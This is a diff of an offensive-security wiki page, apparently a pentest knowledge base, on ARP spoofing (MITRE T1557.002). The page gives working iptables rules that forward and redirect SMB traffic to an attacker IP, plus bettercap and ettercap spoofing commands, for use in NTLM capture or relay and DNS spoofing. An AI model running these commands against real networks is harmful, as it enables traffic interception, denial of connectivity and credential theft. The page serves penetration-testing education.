@@ -2,7 +2,7 @@
 description: MITRE ATT&CK™ Sub-technique T1557.002
 ---
 
-# 🛠️ ARP spoofing
+# ARP spoofing
 
 ## Theory
 
@@ -14,12 +14,14 @@ The ARP \(Address Resolution Protocol\) is used to link IPv4 addresses with MAC 
 Since spoofing every address in a subnet can cause temporary but severe disruption in that subnet, it is highly recommended to target specific addresses and machines while doing ARP spoofing.
 {% endhint %}
 
-Examples of attacks
+There are multiple scenarios where ARP spoofing can be used to operate lateral movement within Active Directory domains. 
 
-* ARP spoofing an SMB server and route received SMB packets to internal capture or relays servers
-* ARP spoofing the DNS server then DNS spoofing when receiving DNS queries
+1. One could spoof an SMB server and route received SMB packets to internal capture or relay servers for [NTLM capture](../abusing-lm-and-ntlm/capturing-hashes.md) or [NTLM relay](../abusing-lm-and-ntlm/relay.md). 
+2. One could also spoof the internal DNS server, so that DNS queries can be answered with fake resolution \([DNS spoofing](dns-spoofing.md)\).
 
-Preparation
+### Preparation
+
+In order to conduct ARP spoofing attacks, the attacker's machine needs to be prepared accordingly \(IP forwarding enabled, outgoing ICMP dropped, internal traffic rerouted\).
 
 ```bash
 # IP forwarding
@@ -32,21 +34,29 @@ iptables -A OUTPUT -p ICMP -j DROP
 iptables --table nat --append PREROUTING --proto tcp --dst $SPOOFED_IP --dport 445 --jump DNAT --to-destination $ATTACKER_IP:445
 ```
 
-Spoofing
+### Spoofing
+
+Tools like [ettercap](https://www.ettercap-project.org/) \(C\) of [bettercap](https://www.bettercap.org/) \(Go\) can then be used to flood the network with ARP announcements for a specific IP address.
 
 {% tabs %}
 {% tab title="Bettercap" %}
-Once bettercap is running
+The following commands can be used to 
+
+* set the targets
+* set bettercap to spoof local connections among computers of the network
+* start the spoofer in ban mode, meaning the target\(s\) connectivity will not work
+* start the spoofer
 
 ```bash
 set arp.spoof.targets $TARGET_TO_POISON_IP
 set arp.spoof.internal true
 arp.ban on
+arp.spoof on
 ```
 {% endtab %}
 
 {% tab title="Ettercap" %}
-
+While bettercap is now usally a better alternative to ettercap, the following command can be used for ARP spoofing.
 
 ```bash
 ettercap --text --quiet --nopromisc --mitm arp:remote /$SWITCH_IP// /$TARGET_TO_POISON_IP//
@@ -56,9 +66,9 @@ ettercap --text --quiet --nopromisc --mitm arp:remote /$SWITCH_IP// /$TARGET_TO_
 
 ## Resources
 
-[http://g-laurent.blogspot.com/2016/10/introducing-responder-multirelay-10.html?m=1](http://g-laurent.blogspot.com/2016/10/introducing-responder-multirelay-10.html?m=1)
+{% embed url="http://g-laurent.blogspot.com/2016/10/introducing-responder-multirelay-10.html" %}
 
-[https://luemmelsec.github.io/Relaying-101/\#arp-spoofing](https://luemmelsec.github.io/Relaying-101/#arp-spoofing)
+{% embed url="https://luemmelsec.github.io/Relaying-101/\#arp-spoofing" %}
 
-
+{% embed url="https://www.bettercap.org/modules/ethernet/spoofers/arp.spoof/" %}
 
